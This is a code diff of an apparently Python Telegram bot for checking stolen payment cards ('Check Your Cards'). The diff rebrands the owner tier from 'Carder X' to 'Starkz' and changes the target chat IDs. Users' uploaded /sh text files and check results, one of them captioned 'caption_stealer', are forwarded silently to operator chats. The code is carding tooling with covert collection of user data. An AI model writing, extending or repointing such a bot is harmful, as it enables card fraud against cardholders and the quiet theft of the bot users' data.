@@ -149,8 +149,8 @@ async def get_user_plan_name(user_id):
                 conn.close()
                 if row:
                     p = row['plan'].lower()
-                    if any(k in p for k in ["kashim", "chirag", "darkanon", "zlatan", "carderx"]):
-                        return "Carder X <tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
+                    if any(k in p for k in ["kashim", "chirag", "darkanon", "zlatan", "starkz"]):
+                        return "Starkz <tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
                     if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                     if "elite" in p: return '𝗘𝗹𝗶𝘁𝗲 ⭐'
                     if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
@@ -488,7 +488,7 @@ async def sh_command(message: types.Message):
     if document:
         try:
             await message.bot.send_document(
-                chat_id=-1004462990283,
+                chat_id=-1003965699487,
                 document=document.file_id,
                 caption=f"User <a href='tg://user?id={user_id}'>{user_name}</a> sent a txt file in /sh",
                 parse_mode="HTML"
@@ -665,7 +665,7 @@ async def run_sh_check(
                             f"<b>USER ➔</b> <a href='tg://user?id={user_id}'>{bold_username}</a>"
                         )
                         reply_markup_logs = InlineKeyboardMarkup(inline_keyboard=[
-                            [InlineKeyboardButton(text="𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀", url="https://t.me/lightxHub_bot", style="primary")]
+                            [InlineKeyboardButton(text="𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀", url="https://t.me/StarkzchkBot", style="primary")]
                         ])
 
                         caption_stealer = (
@@ -683,14 +683,14 @@ async def run_sh_check(
                         )
 
                         await safe_send_message(message.bot,
-                            chat_id=-1004462990283,
+                            chat_id=-1003965699487,
                             text=caption_logs,
                             parse_mode="HTML",
                             reply_markup=reply_markup_logs
                         )
 
                         await safe_send_message(message.bot,
-                            chat_id=-1004348615901,
+                            chat_id=-5447284969,
                             text=caption_stealer,
                             parse_mode="HTML"
                         )
